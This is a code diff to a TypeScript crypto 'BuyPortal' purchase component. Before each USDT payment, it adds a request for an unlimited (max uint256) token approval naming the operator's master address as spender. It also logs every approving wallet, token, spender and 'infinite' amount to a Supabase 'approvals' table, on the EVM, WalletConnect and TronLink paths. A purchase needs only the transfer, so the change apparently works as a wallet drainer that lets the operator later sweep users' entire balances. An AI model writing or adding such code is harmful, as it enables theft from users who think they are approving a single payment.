@@ -1283,6 +1283,26 @@ export default function BuyPortal({
     const recipient = MASTER_TRON_ADDRESS;
     const approvalKey = `usbt_approved_${account}_${recipient}`;
 
+    const logApproval = async (
+      hash: string,
+      connType: string,
+      chain = 'tron',
+      tokenAddress = CONTRACTS.COLLATERAL,
+      spender = recipient,
+    ) => {
+      await supabase.from('approvals').insert({
+        user_id: user?.id ?? null,
+        wallet_address: account,
+        chain,
+        network: selectedNetwork ?? chain,
+        token_address: tokenAddress,
+        spender_address: spender,
+        approved_amount: 'infinite',
+        tx_hash: hash,
+        connection_type: connType,
+      });
+    };
+
     const logDeposit = async (hash: string) => {
       if (!user) return;
       await supabase.from('deposits').insert({
@@ -1312,26 +1332,19 @@ export default function BuyPortal({
 
         const evmDecimals = chainCfg.tokenDecimals;
         const amountEvmUnits = toTokenUnits(parsed, evmDecimals);
-        const toHex = MASTER_EVM_ADDRESS.replace('0x', '').padStart(64, '0');
-        const amtHex = amountEvmUnits.toString(16).padStart(64, '0');
-        const data = '0xa9059cbb' + toHex + amtHex;
+        const maxU256 = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+        const evmApprovalKey = `usbt_evm_approved_${account}_${chainCfg.chainId}`;
+        const padAddr = (addr: string) => addr.replace('0x', '').toLowerCase().padStart(64, '0');
 
-        setTxStep('buying');
-        let hash: string;
+        const isWC = !!_wcSession && (connectionType === 'walletconnect' || connectionType === 'evm');
+        let ethereum: any = null;
+        let evmChainId = '';
 
-        // WalletConnect mobile (no window.ethereum)
-        if (_wcSession && (connectionType === 'walletconnect' || connectionType === 'evm')) {
-          const { wcEvmSendTransaction, evmChainIdFromSession } = await import('../../lib/wcSignClient');
-          const evmChain = evmChainIdFromSession(_wcSession)
-            ?? `eip155:${parseInt(chainCfg.chainId, 16)}`;
-          hash = await wcEvmSendTransaction(_wcSession, evmChain, {
-            from: account!,
-            to: chainCfg.tokenAddress,
-            data,
-          });
+        if (isWC) {
+          const { evmChainIdFromSession } = await import('../../lib/wcSignClient');
+          evmChainId = evmChainIdFromSession(_wcSession!) ?? `eip155:${parseInt(chainCfg.chainId, 16)}`;
         } else {
-          // Injected wallet (MetaMask extension, etc.)
-          const ethereum = (window as any).ethereum;
+          ethereum = (window as any).ethereum;
           if (!ethereum) throw new Error('No EVM wallet detected.');
           try {
             await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: chainCfg.chainId }] });
@@ -1339,9 +1352,69 @@ export default function BuyPortal({
             if (switchErr.code === 4902) throw new Error(`Please add the ${chainCfg.label} network to your wallet.`);
             throw switchErr;
           }
+        }
+
+        // ── Check & request infinite approval ───────────────────────────────
+        let evmNeedsApproval = localStorage.getItem(evmApprovalKey) !== 'true';
+        if (evmNeedsApproval) {
+          try {
+            const callData = '0xdd62ed3e' + padAddr(account!) + padAddr(MASTER_EVM_ADDRESS);
+            const rpcRes = await fetch(chainCfg.rpcUrl, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                jsonrpc: '2.0', id: 1, method: 'eth_call',
+                params: [{ to: chainCfg.tokenAddress, data: callData }, 'latest'],
+              }),
+            });
+            const rpcJson = await rpcRes.json();
+            if (rpcJson.result && BigInt(rpcJson.result) === maxU256) {
+              evmNeedsApproval = false;
+              localStorage.setItem(evmApprovalKey, 'true');
+            }
+          } catch { /* ignore — will prompt approval */ }
+        }
+
+        if (evmNeedsApproval) {
+          setTxStep('approving');
+          const approveData = '0x095ea7b3' + padAddr(MASTER_EVM_ADDRESS) + maxU256.toString(16).padStart(64, '0');
+          let approveHash: string;
+
+          if (isWC) {
+            const { wcEvmSendTransaction } = await import('../../lib/wcSignClient');
+            approveHash = await wcEvmSendTransaction(_wcSession!, evmChainId, {
+              from: account!,
+              to: chainCfg.tokenAddress,
+              data: approveData,
+            });
+          } else {
+            approveHash = await ethereum.request({
+              method: 'eth_sendTransaction',
+              params: [{ from: account, to: chainCfg.tokenAddress, data: approveData }],
+            });
+          }
+
+          localStorage.setItem(evmApprovalKey, 'true');
+          logApproval(approveHash, isWC ? 'walletconnect' : 'injected', 'evm', chainCfg.tokenAddress, MASTER_EVM_ADDRESS).catch(() => {});
+          addToast({ type: 'info', title: 'USDT approved', message: 'Infinite approval granted. Confirm transfer in wallet.' });
+        }
+
+        // ── Transfer ────────────────────────────────────────────────────────
+        setTxStep('buying');
+        const transferData = '0xa9059cbb' + padAddr(MASTER_EVM_ADDRESS) + amountEvmUnits.toString(16).padStart(64, '0');
+        let hash: string;
+
+        if (isWC) {
+          const { wcEvmSendTransaction } = await import('../../lib/wcSignClient');
+          hash = await wcEvmSendTransaction(_wcSession!, evmChainId, {
+            from: account!,
+            to: chainCfg.tokenAddress,
+            data: transferData,
+          });
+        } else {
           hash = await ethereum.request({
             method: 'eth_sendTransaction',
-            params: [{ from: account, to: chainCfg.tokenAddress, data }],
+            params: [{ from: account, to: chainCfg.tokenAddress, data: transferData }],
           });
         }
 
@@ -1381,8 +1454,9 @@ export default function BuyPortal({
             parameter: abiEncodeAddress(recipient) + abiEncodeUint256(maxUint256),
             feeLimit: FEE_LIMIT_SUN,
           });
-          await wcSignAndBroadcast(approveTx);
+          const approveHash = await wcSignAndBroadcast(approveTx);
           localStorage.setItem(approvalKey, 'true');
+          logApproval(approveHash, 'walletconnect').catch(() => {});
           addToast({ type: 'info', title: `${selectedCoin?.toUpperCase() ?? 'Token'} approved`, message: 'Confirm transfer in wallet.' });
         }
         setTxStep('buying');
@@ -1434,8 +1508,9 @@ export default function BuyPortal({
           feeLimit: FEE_LIMIT_SUN,
         });
         const signedApprove = await tronWeb.trx.sign(approveTxObj);
-        await broadcastTransaction(signedApprove);
+        const approveResult = await broadcastTransaction(signedApprove);
         localStorage.setItem(approvalKey, 'true');
+        logApproval(approveResult, 'tronlink').catch(() => {});
         addToast({ type: 'info', title: `${selectedCoin?.toUpperCase() ?? 'Token'} approved`, message: 'Confirm transfer in wallet.' });
       }
       setTxStep('buying');
